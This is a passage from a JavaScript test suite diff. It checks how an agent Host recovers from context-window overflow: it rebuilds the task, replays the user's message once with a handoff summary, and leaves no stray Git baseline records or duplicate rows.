+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  assert.equal(disposed, false);
+  t.mock.timers.tick(1);
+  await disposing;
+  assert.equal(disposed, true, 'both recoveries share the one limit, not one each');
+});
+
+// The recovery factory assembled on the Host's ports (context-recovery-assembly.ts) over a real
+// profile database: the desktop's rollover reads the task and its messages, commits the rebuild and
+// replays the user's message through the Host's own send transaction.
+const quiet = { info() {}, warn() {}, error() {} };
+// One Host runtime over a profile database: the input queue, its recovery rollover and the Host's
+// pending handoff registry (handoff-pending.ts), as main.ts assembles them.
+function assembledRuntime(t, db, overrides = {}) {
+  const runtimes = [];
+  let h;
+  const handoffs = createHostAgentHandoffPending({ getOwner: getCurrentDbClientSnapshot,
+    publish: event => h.events.push(event), log: quiet });
+  h = createHarness({
+    persistMessage: db.persistMessage,
+    pendingHandoff: handoffs,
+    readSession: async id => ({ id, status: 'active', agentKind: 'claude-code', model: 'stored-model',
+      workingDir: db.root, providerId: 'xd', permissionMode: 'ask', planModeEnabled: false }),
+    isContextRecoveryOpen: () => true,
+    createContextRecoveryRollover: runtime => {
+      runtimes.push(runtime);
+      return createHostContextRecoveryRollover({ getMaker: () => h.maker, persistMessage: db.persistMessage,
+        publish: event => h.events.push(event), buildCreateOptsWithStderr: createSessionStderrOptions(quiet),
+        readSessionExtraDirsFromDb: async () => [], readSessionWritableDirsFromDb: async () => [],
+        pendingHandoff: handoffs, log: quiet }, runtime);
+    },
+    ...overrides,
+  });
+  t.after(() => h.queue.dispose());
+  return { h, handoffs, runtimes };
+}
+
+async function assembledRecovery(t, overrides = {}) {
+  const db = await recoveryDatabase(t);
+  const { h, handoffs, runtimes } = assembledRuntime(t, db, overrides);
+  const overflow = async (sessionId, text = 'long task') => {
+    await db.createTask(sessionId);
+    await h.queue.enqueue(sessionId, { clientId: `${sessionId}-input`, text });
+    await waitFor(() => h.maker.sessions.get(sessionId)?.sent.length === 1);
+    const session = h.maker.sessions.get(sessionId);
+    session.emit({ type: 'error', data: OVERFLOW, sessionTurnGeneration: session.generation, sessionInstanceId: session.instanceId });
+    return session;
+  };
+  const rows = (id, role) => db.db.prepare('SELECT client_id, content FROM messages WHERE session_id = ? AND role = ?').all(id, role);
+  const marker = id => JSON.parse(rows(id, 'context_rebuild').at(-1).content);
+  return { db, h, handoffs, runtimes, overflow, rows, marker };
+}
+
+test('context recovery assembly: an overflow rebuilds the task and replays the message on a new runtime, with no error left', { timeout: 30_000 }, async t => {
+  const r = await assembledRecovery(t);
+  const first = await r.overflow('assembled-ok');
+  await waitFor(() => { const next = r.h.maker.sessions.get('assembled-ok'); return next && next !== first && next.sent.length === 1; });
+  const replayed = r.h.maker.sessions.get('assembled-ok');
+  // The replay is the first send after the rebuild: it carries the rebuilt context's summary.
+  const { handoff } = r.marker('assembled-ok');
+  assert.deepEqual(replayed.sent, [`${handoff}\n\nlong task`], 'the replay sends the user\'s message once, after the summary');
+  assert.equal(replayed.options.resumeSessionId, undefined, 'the new runtime does not resume the overflowed context');
+  await waitFor(() => !r.h.queue.projection('assembled-ok').error);
+  assert.equal(r.rows('assembled-ok', 'context_rebuild').length, 1, 'the rebuild marker is committed');
+  // The client learns the task was rebuilt: no native session, no context used (commitContextRecoveryWithPorts).
+  const rebuilt = r.h.events.filter(event => event.type === 'session_changed' && event.sessionId === 'assembled-ok'
+    && event.patch && 'sdkSessionId' in event.patch);
+  assert.equal(rebuilt.length, 1);
+  assert.deepEqual(Object.keys(rebuilt[0].patch).sort(), ['contextTokens', 'sdkSessionId', 'updatedAt']);
+  assert.equal(rebuilt[0].patch.sdkSessionId, null);
+  assert.equal(rebuilt[0].patch.contextTokens, 0);
+  assert.ok(Number.isFinite(Date.parse(rebuilt[0].patch.updatedAt)), 'with the commit\'s update time');
+  assert.equal(r.rows('assembled-ok', 'user').length, 1, 'the replay writes no second user row');
+  assert.equal(r.rows('assembled-ok', 'error').length, 0, 'a recovered overflow writes no error row');
+  assert.equal(r.h.events.filter(event => event.sessionId === 'assembled-ok' && event.type === 'error').length, 0);
+  await waitFor(() => r.marker('assembled-ok').consumed === true);
+  assert.equal(await r.handoffs.peek('assembled-ok'), null, 'the summary is sent once, and the database knows it');
+  // The runtime starts as a normal send's would. The shared replay (contextRecoveryAssembly.ts) also
+  // passes the task title, which Maker only logs and uses for a task row it creates (this one exists).
+  const comparable = options => JSON.parse(JSON.stringify(options, (_key, value) => (typeof value === 'function' ? '[function]' : value)));
+  const { title, ...replayOptions } = comparable(replayed.options);
+  assert.equal(title, 'Recovery fixture');
+  assert.deepEqual(replayOptions, comparable(first.options), 'the replay starts its runtime with a normal send\'s options');
+  assert.equal(r.h.queue.projection('assembled-ok').queuePaused, false, 'the cleared queue is not left paused');
+  replayed.emit({ type: 'done', data: {}, sessionTurnGeneration: replayed.generation, sessionInstanceId: replayed.instanceId });
+  await waitFor(() => !r.h.queue.projection('assembled-ok').running);
+});
+
+test('context recovery assembly: one rollover per input runtime, a new one after the runtime is replaced', { timeout: 30_000 }, async t => {
+  const r = await assembledRecovery(t);
+  assert.equal(r.runtimes.length, 1);
+  await r.h.queue.dispose();
+  assert.equal(r.runtimes.length, 2, 'a replaced runtime (owner change, shutdown) gets its own rollover');
+  assert.notEqual(r.runtimes[0], r.runtimes[1]);
+});
+
+test('context recovery assembly: the replay is refused while the task has a live runtime and opens no Git baseline', { timeout: 30_000 }, async t => {
+  const git = [];
+  const r = await assembledRecovery(t, { getGitSnapshot: () => ({ onTurnStart() { git.push('start'); },
+    onTurnAbort() { git.push('abort'); }, onTurnEnd() { git.push('end'); }, onSessionClosed() {} }) });
+  await r.db.createTask('assembled-live');
+  await r.h.queue.enqueue('assembled-live', { clientId: 'live-input', text: 'hello' });
+  const live = await (async () => { await waitFor(() => r.h.maker.sessions.get('assembled-live')?.sent.length === 1); return r.h.maker.sessions.get('assembled-live'); })();
+  live.emit({ type: 'done', data: {}, sessionTurnGeneration: live.generation, sessionInstanceId: live.instanceId });
+  await waitFor(() => !r.h.queue.projection('assembled-live').running);
+  git.length = 0;
+  const result = await r.runtimes[0].replay('assembled-live', 'hello', { agentKind: 'claude-code', workingDir: r.db.root });
+  assert.deepEqual(result, { accepted: false });
+  assert.deepEqual(live.sent, ['hello'], 'nothing reaches the live runtime');
+  assert.deepEqual(git, []);
+});
+
+// onRebuilt clears the coordinator's error as the desktop does (contextRecoveryRebuilt), with no
+// execution pause: a pause would abort a steer in flight (setExecutionPaused), which the desktop never does.
+test('context recovery assembly: the replay is refused while a turn of the task is still running, even with its runtime gone', { timeout: 30_000 }, async t => {
+  const git = [];
+  const r = await assembledRecovery(t, { getGitSnapshot: () => ({ onTurnStart() { git.push('start'); },
+    onTurnAbort() { git.push('abort'); }, onTurnEnd() { git.push('end'); }, onSessionClosed() {} }) });
+  await r.db.createTask('assembled-running');
+  await r.h.queue.enqueue('assembled-running', { clientId: 'running-input', text: 'hello' });
+  await waitFor(() => r.h.maker.sessions.get('assembled-running')?.sent.length === 1);
+  // The turn has not ended; its runtime is no longer the task's live one.
+  r.h.maker.sessions.delete('assembled-running');
+  assert.equal(r.h.queue.projection('assembled-running').turnInProgress, true);
+  git.length = 0;
+  const result = await r.runtimes[0].replay('assembled-running', 'hello', { agentKind: 'claude-code', workingDir: r.db.root });
+  assert.deepEqual(result, { accepted: false });
+  assert.equal(r.h.maker.sessions.has('assembled-running'), false, 'no runtime is started');
+  assert.deepEqual(git, [], 'no Git baseline');
+});
+
+// Bug (Greptile on #10613): the replay opened its own Git baseline before dispatch and the shared send
+// transaction opened another (a replay has no persistUserMessage, so the transaction's
+// beforeDispatchDirectUserTurn runs), leaving one extra turn-start record per recovery for the next
+// turn's end to take. Rule: the desktop's replay (contextRecoveryAssembly.ts) opens and drops its
+// baseline only through the transaction. Asserted on the real snapshot coordinator's records.
+for (const outcome of ['accepted', 'refused', 'throws']) {
+  const name = { accepted: 'an accepted replay', refused: 'a refused replay', throws: 'a replay whose send throws' }[outcome];
+  test(`context recovery assembly: ${name} leaves no Git baseline record behind`, { timeout: 30_000 }, async t => {
+    const coordinator = new GitSnapshotCoordinator({ readAutoSnapshotEnabled: () => false,
+      detectRepoRoot: async () => null, getSessionContext: async () => null,
+      createShadowSavepoint: async () => { throw new Error('unused'); },
+      createShadowMarker: async () => { throw new Error('unused'); },
+      oneShot: async () => '', logger: { ...quiet, debug() {} } });
+    const calls = [];
+    const gitSnapshot = {
+      onTurnStart: (id, signal) => { calls.push('start'); return coordinator.onTurnStart(id, signal); },
+      onTurnAbort: id => { calls.push('abort'); coordinator.onTurnAbort(id); },
+      onTurnEnd: id => { calls.push('end'); return coordinator.onTurnEnd(id); },
+      onSessionClosed: id => coordinator.onSessionClosed(id),
+    };
+    const r = await assembledRecovery(t, { getGitSnapshot: () => gitSnapshot });
+    const id = `assembled-git-${outcome}`;
+    await r.db.createTask(id);
+    await r.h.queue.enqueue(id, { clientId: `${id}-input`, text: 'hello' });
+    await waitFor(() => r.h.maker.sessions.get(id)?.sent.length === 1);
+    const first = r.h.maker.sessions.get(id);
+    first.emit({ type: 'done', data: {}, sessionTurnGeneration: first.generation, sessionInstanceId: first.instanceId });
+    await waitFor(() => !r.h.queue.projection(id).turnInProgress && !coordinator.hasPendingTurnStart(id));
+    // Recovery closes the runtime before it replays.
+    r.h.maker.sessions.delete(id);
+    calls.length = 0;
+    if (outcome !== 'accepted') {
+      const create = r.h.maker.createSession;
+      r.h.maker.createSession = async opts => {
+        const session = await create(opts);
+        session.send = async (_text, sendOpts = {}) => {
+          sendOpts.onTurnReserved?.(++session.generation);
+          // The vendor refuses or fails after the transaction's pre-dispatch hook ran.
+          await sendOpts.onAccepted?.(sendOpts.signal);
+          if (outcome === 'throws') throw new Error('vendor failed');
+          return { accepted: false };
+        };
+        return session;
+      };
+    }
+    const replaying = r.runtimes[0].replay(id, 'hello', { agentKind: 'claude-code', workingDir: r.db.root });
+    if (outcome === 'throws') await assert.rejects(replaying, /vendor failed/);
+    else assert.equal((await replaying).accepted, outcome === 'accepted');
+    if (outcome === 'accepted') {
+      const replayed = r.h.maker.sessions.get(id);
+      replayed.emit({ type: 'done', data: {}, sessionTurnGeneration: replayed.generation, sessionInstanceId: replayed.instanceId });
+      await waitFor(() => !r.h.queue.projection(id).turnInProgress);
+    }
+    await waitFor(() => calls.length >= 2);
+    assert.deepEqual(calls, ['start', outcome === 'accepted' ? 'end' : 'abort']);
+    assert.equal(coordinator.hasPendingTurnStart(id), false, 'no baseline record is left for the next turn to take');
+  });
+}
+
+// Bug (Greptile on #10613): the replay's turn carried no client id, so none of its events matched the
+// /api/chat stream of the message it replays (chat.mjs ends on a terminal of its own clientId) and the
+// claimed overflow error is held, so the stream never ended after the answer. Rule: a Host turn's events
+// carry its input's clientId; the replay takes the claimed turn's, only to stamp events and receipts
+// (no user row, no persistUserMessage). The desktop has no counterpart: its renderer does not end a
+// view on a client id (release table section 7).
+// The replay's client id lives exactly as long as the task's running recovery (context-recovery.ts
+// replayClientId): it is there while the recovery runs and gone once it recovers, fails, throws, is
+// rebuilt or is drained at shutdown, so no later, unrelated replay (a rebuild that has no terminal,
+// such as a model change) is stamped with an old message's id.
+for (const end of ['recovers', 'fails', 'throws', 'rebuilt', 'shutdown']) {
+  const label = { recovers: 'recovers', fails: 'fails (a refused replay included)', throws: 'throws', rebuilt: 'is rebuilt', shutdown: 'is drained at shutdown' }[end];
+  test(`context recovery: the replay client id is gone once the recovery ${label}`, { timeout: 10_000 }, async t => {
+    let release;
+    const gate = new Promise(resolve => { release = resolve; });
+    let seen;
+    let recovery;
+    const rollover = {
+      claim: () => 'claimed',
+      tryRecover: async () => {
+        seen = recovery.replayClientId('lifecycle');
+        if (end === 'rebuilt') recovery.noteRebuilt('lifecycle');
+        await gate;
+        if (end === 'throws') throw new Error('recovery failed');
+        return end !== 'fails';
+      },
+    };
+    recovery = createHostContextRecovery({ getRollover: () => rollover, publish() {}, log: quiet });
+    const history = { reserveTurnErrorPersistId: () => 'row', releaseReservedTurnErrorPersistId() {},
+      onTurnErrorEvent() {}, drain: async () => {} };
+    const terminal = { session: { id: 'lifecycle', remoteHostId: null }, history,
+      event: { type: 'error', data: OVERFLOW }, fields: { inputClientId: 'lifecycle-input' },
+      isStopping: false, isGatewayProxyTokenRecovery: false };
+    assert.equal(recovery.replayClientId('lifecycle'), undefined, 'no recovery, no client id');
+    const claim = recovery.claim(terminal);
+    assert.equal(claim, 'claimed');
+    recovery.settle(terminal, claim, async () => {});
+    await waitFor(() => seen !== undefined);
+    assert.equal(seen, 'lifecycle-input', 'the running recovery\'s replay gets the claimed input\'s id');
+    if (end === 'shutdown') {
+      t.mock.timers.enable({ apis: ['setTimeout'] });
+      const draining = recovery.drainForShutdown();
+      t.mock.timers.tick(RECOVERY_SHUTDOWN_WAIT_MS);
+      await draining;
+    } else {
+      release();
+      await new Promise(resolve => setImmediate(resolve));
+      await new Promise(resolve => setImmediate(resolve));
+    }
+    assert.equal(recovery.replayClientId('lifecycle'), undefined);
+    release();
+  });
+}
+
+async function chatThroughRecovery(t, overrides = {}) {
+  const hub = createEventHub();
+  const r = await assembledRecovery(t, { hub, ...overrides });
+  const writes = [];
+  const response = Object.assign(new EventEmitter(), {
+    writableEnded: false, headersSent: false,
+    writeHead(status) { this.statusCode = status; this.headersSent = true; },
+    write(chunk) { writes.push(String(chunk)); },
+    end(chunk) { if (chunk) writes.push(String(chunk)); this.writableEnded = true; this.emit('close'); },
+  });
+  const chat = createChatHandler({ events: hub, readSession: async id => ({ id, status: 'active' }),
+    createSession: async () => { throw new Error('the task exists'); },
+    enqueue: (id, input) => r.h.queue.enqueue(id, input), inputStatus: async () => 'running' });
+  const send = async (id, clientId) => {
+    await r.db.createTask(id);
+    await chat(Readable.from([Buffer.from(JSON.stringify({ sessionId: id, clientId, prompt: 'long task' }))]), response);
+    await waitFor(() => r.h.maker.sessions.get(id)?.sent.length === 1);
+    const first = r.h.maker.sessions.get(id);
+    first.emit({ type: 'error', data: OVERFLOW, sessionTurnGeneration: first.generation, sessionInstanceId: first.instanceId });
+    return first;
+  };
+  const streamed = () => writes.join('').split('\n\n').filter(line => line.startsWith('data: '))
+    .map(line => JSON.parse(line.slice('data: '.length)));
+  return { ...r, response, writes, send, streamed };
+}
+
+test('context recovery through /api/chat: the stream carries the replay\'s answer and ends after its done, with one user row', { timeout: 30_000 }, async t => {
+  const c = await chatThroughRecovery(t);
+  const first = await c.send('chat-recovered', 'chat-input');
+  await waitFor(() => { const next = c.h.maker.sessions.get('chat-recovered'); return next && next !== first && next.sent.length === 1; });
+  const replayed = c.h.maker.sessions.get('chat-recovered');
+  const stamp = { sessionTurnGeneration: replayed.generation, sessionInstanceId: replayed.instanceId };
+  replayed.emit({ type: 'text', data: { text: 'replayed answer' }, ...stamp });
+  await waitFor(() => c.streamed().some(event => event.event?.data?.text === 'replayed answer' || event.data?.text === 'replayed answer'));
+  assert.equal(c.response.writableEnded, false, 'the stream is still open while the replay runs');
+  replayed.emit({ type: 'done', data: {}, ...stamp });
+  await waitFor(() => c.response.writableEnded);
+  const answer = c.streamed().filter(event => event.inputClientId === 'chat-input' && event.type === 'text');
+  assert.equal(answer.length, 1, 'the replay\'s answer is stamped with the replayed message\'s client id');
+  assert.equal(c.streamed().filter(event => event.type === 'error').length, 0, 'the held overflow error is not shown');
+  assert.match(c.writes.at(-1), /event: end/);
+  assert.equal(c.rows('chat-recovered', 'user').length, 1, 'the replay writes no second user row');
+  assert.deepEqual(c.rows('chat-recovered', 'user').map(row => row.client_id), ['chat-input']);
+});
+
+test('context recovery through /api/chat: a stop during the replay ends the stream with the message\'s interrupted receipt', { timeout: 30_000 }, async t => {
+  const c = await chatThroughRecovery(t);
+  const first = await c.send('chat-stopped', 'chat-stop-input');
+  await waitFor(() => { const next = c.h.maker.sessions.get('chat-stopped'); return next && next !== first && next.sent.length === 1; });
+  assert.equal(c.response.writableEnded, false);
+  await c.h.queue.stop('chat-stopped');
+  await waitFor(() => c.response.writableEnded);
+  assert.ok(c.streamed().some(event => event.type === 'input_receipt' && event.inputClientId === 'chat-stop-input'
+    && event.status === 'interrupted'));
+  assert.equal(c.rows('chat-stopped', 'user').length, 1);
+});
+
+test('context recovery through /api/chat: a recovery that fails shows the held error to the message\'s stream, which ends', { timeout: 30_000 }, async t => {
+  const c = await chatThroughRecovery(t);
+  const create = c.h.maker.createSession;
+  let created = 0;
+  c.h.maker.createSession = async opts => {
+    const session = await create(opts);
+    // The replay's runtime fails to send: the recovery fails.
+    if (++created === 2) session.send = async () => { throw new Error('vendor failed'); };
+    return session;
+  };
+  await c.send('chat-failed', 'chat-fail-input');
+  await waitFor(() => c.response.writableEnded);
+  const errors = c.streamed().filter(event => event.type === 'error');
+  assert.equal(errors.length, 1);
+  assert.equal(errors[0].inputClientId, 'chat-fail-input', 'the error carries the replayed message\'s client id');
+  assert.equal(c.rows('chat-failed', 'user').length, 1);
+});
+
+test('context recovery assembly: a steer in flight when the replay is accepted is not aborted', { timeout: 30_000 }, async t => {
+  const r = await assembledRecovery(t);
+  let releaseReplay, releaseSteer, steering;
+  const replayHeld = new Promise(resolve => { releaseReplay = resolve; });
+  const steerHeld = new Promise(resolve => { releaseSteer = resolve; });
+  const steerStarted = new Promise(resolve => { steering = resolve; });
+  const create = r.h.maker.createSession.bind(r.h.maker);
+  let created = 0;
+  r.h.maker.createSession = async (...args) => {
+    const session = await create(...args);
+    if ((created += 1) === 2) {
+      // The replay's runtime: its send is held after the engine took the turn, before it is accepted.
+      const send = session.send.bind(session);
+      session.send = async (...sendArgs) => { const result = await send(...sendArgs); await replayHeld; return result; };
+      const steer = session.steer.bind(session);
+      session.steer = async (text, options = {}) => steer(text, { ...options,
+        beforeProviderStart: async () => { steering(); await steerHeld; await options.beforeProviderStart?.(); } });
+    }
+    return session;
+  };
+  const first = await r.overflow('assembled-steer');
+  await waitFor(() => created === 2 && r.h.maker.sessions.get('assembled-steer')?.sent.length === 1);
+  const replayed = r.h.maker.sessions.get('assembled-steer');
+  assert.notEqual(replayed, first);
+  const steered = r.h.queue.steer('assembled-steer', { clientId: 'steer-during-replay', text: 'also this' });
+  await steerStarted;
+  releaseReplay();
+  await waitFor(() => !r.h.queue.projection('assembled-steer').error);
+  releaseSteer();
+  assert.equal(await steered, true, 'the steer is accepted');
+  assert.deepEqual(replayed.sent, [`${r.marker('assembled-steer').handoff}\n\nlong task`, 'steer:also this']);
+});
+
+test('context recovery assembly: onRebuilt changes nothing once the runtime is closing, the task is closed or the owner changed', { timeout: 30_000 }, async t => {
+  // Recovery closed for every kind: the overflow stays the coordinator's error, as the client saw it.
+  let owner = { id: 'owner-a' };
+  const r = await assembledRecovery(t, { isContextRecoveryOpen: () => false, getOwner: () => owner });
+  const failed = async id => {
+    await r.overflow(id);
+    await waitFor(() => Boolean(r.h.queue.projection(id).error));
+  };
+  const clear = id => r.runtimes.at(-1).coordinator.clearError(id);
+  await failed('rebuilt-control');
+  clear('rebuilt-control');
+  assert.equal(r.h.queue.projection('rebuilt-control').error, null, 'otherwise it clears the error at once');
+
+  await failed('rebuilt-closed');
+  const closing = r.h.queue.disposeSession('rebuilt-closed');
+  clear('rebuilt-closed');
+  assert.match(r.h.queue.projection('rebuilt-closed').error, /prompt is too long/, 'a closed task keeps its state');
+  await closing;
+
+  await failed('rebuilt-owner');
+  owner = { id: 'owner-b' };
+  clear('rebuilt-owner');
+  assert.match(r.h.queue.projection('rebuilt-owner').error, /prompt is too long/, 'a runtime whose owner changed keeps its state');
+
+  const disposing = r.h.queue.dispose();
+  clear('rebuilt-owner');
+  owner = { id: 'owner-a' };
+  clear('rebuilt-owner');
+  assert.match(r.h.queue.projection('rebuilt-owner').error, /prompt is too long/, 'a closing runtime keeps its state');
+  await disposing;
+});
+
+test('context recovery assembly: input queued while the replayed turn runs waits for it', { timeout: 30_000 }, async t => {
+  const r = await assembledRecovery(t);
+  const first = await r.overflow('assembled-next');
+  await waitFor(() => { const next = r.h.maker.sessions.get('assembled-next'); return next && next !== first && next.sent.length === 1; });
+  const replayed = r.h.maker.sessions.get('assembled-next');
+  await waitFor(() => !r.h.queue.projection('assembled-next').error);
+  await r.h.queue.enqueue('assembled-next', { clientId: 'after-replay', text: 'next' });
+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  const replay = `${r.marker('assembled-next').handoff}\n\nlong task`;
+  assert.deepEqual(replayed.sent, [replay], 'the queued input waits while the replay runs');
+  replayed.emit({ type: 'done', data: {}, sessionTurnGeneration: replayed.generation, sessionInstanceId: replayed.instanceId });
+  await waitFor(() => replayed.sent.length === 2);
+  assert.deepEqual(replayed.sent, [replay, 'next'], 'the summary went with the replay only');
+});
+
+test('context recovery assembly: a summary not yet sent when the Host restarts goes with the next send, once', { timeout: 30_000 }, async t => {
+  const r = await assembledRecovery(t);
+  // The replay's runtime cannot start: the rebuild is committed, its summary never sent.
+  const create = r.h.maker.createSession.bind(r.h.maker);
+  let created = 0;
+  r.h.maker.createSession = async (...args) => {
+    if ((created += 1) === 2) throw new Error('engine unavailable');
+    return create(...args);
+  };
+  await r.overflow('assembled-restart');
+  await waitFor(() => r.rows('assembled-restart', 'error').length === 1);
+  const { handoff, consumed } = r.marker('assembled-restart');
+  assert.equal(consumed, false);
+  await r.h.queue.dispose();
+  // A new Host process: a new queue and a new registry on the same database.
+  const restarted = assembledRuntime(t, r.db);
+  await restarted.h.queue.enqueue('assembled-restart', { clientId: 'after-restart', text: 'continue' });
+  await waitFor(() => restarted.h.maker.sessions.get('assembled-restart')?.sent.length === 1);
+  const session = restarted.h.maker.sessions.get('assembled-restart');
+  assert.deepEqual(session.sent, [`${handoff}\n\ncontinue`]);
+  await waitFor(() => r.marker('assembled-restart').consumed === true);
+  session.emit({ type: 'done', data: {}, sessionTurnGeneration: session.generation, sessionInstanceId: session.instanceId });
+  await waitFor(() => !restarted.h.queue.projection('assembled-restart').running);
+  await restarted.h.queue.enqueue('assembled-restart', { clientId: 'after-restart-2', text: 'and again' });
+  await waitFor(() => session.sent.length === 2);
+  assert.equal(session.sent[1], 'and again', 'sent once');
+});
+
+test('context recovery assembly: an engine switch summary left by the desktop goes with the Host\'s next send and its boundary is shown consumed', { timeout: 30_000 }, async t => {
+  const db = await recoveryDatabase(t);
+  await db.createTask('host-switch');
+  db.db.prepare(`INSERT INTO messages (id, client_id, session_id, role, content, created_at)
+    VALUES ('switch-row', 'switch-boundary', 'host-switch', 'agent_switch', ?, ?)`)
+    .run(JSON.stringify({ handoff: 'SWITCH SUMMARY', consumed: false, fromAgentKind: 'codex' }), Date.now());
+  const { h } = assembledRuntime(t, db);
+  await h.queue.enqueue('host-switch', { clientId: 'host-switch-input', text: 'hello' });
+  await waitFor(() => h.maker.sessions.get('host-switch')?.sent.length === 1);
+  assert.deepEqual(h.maker.sessions.get('host-switch').sent, ['SWITCH SUMMARY\n\nhello']);
+  await waitFor(() => h.events.some(event => event.type === 'message_created' && event.message?.clientId === 'switch-boundary'));
+  const shown = h.events.filter(event => event.type === 'message_created' && event.message?.clientId === 'switch-boundary');
+  assert.equal(shown.length, 1);
+  assert.deepEqual(shown[0].message.content, { handoff: 'SWITCH SUMMARY', consumed: true, fromAgentKind: 'codex' });
+  const stored = JSON.parse(db.db.prepare("SELECT content FROM messages WHERE client_id = 'switch-boundary'").get().content);
+  assert.equal(stored.consumed, true);
+});
+
+test('context recovery assembly: an overflow of a closed kind takes the normal error path with the rollover assembled', { timeout: 30_000 }, async t => {
+  // As main.ts: open kinds by contextRecoveryKind; here only another kind is open.
+  const r = await assembledRecovery(t, { isContextRecoveryOpen: data => contextRecoveryKind(data) === 'oversized-history' });
+  const first = await r.overflow('assembled-closed');
+  await waitFor(() => r.rows('assembled-closed', 'error').length === 1);
+  await waitFor(() => r.h.events.filter(event => event.sessionId === 'assembled-closed' && event.type === 'error').length === 1);
+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  assert.equal(r.rows('assembled-closed', 'context_rebuild').length, 0, 'no rebuild');
+  assert.equal(r.h.maker.sessions.get('assembled-closed'), first, 'the runtime is not replaced');
+  assert.match(r.h.queue.projection('assembled-closed').error, /prompt is too long/);
 });
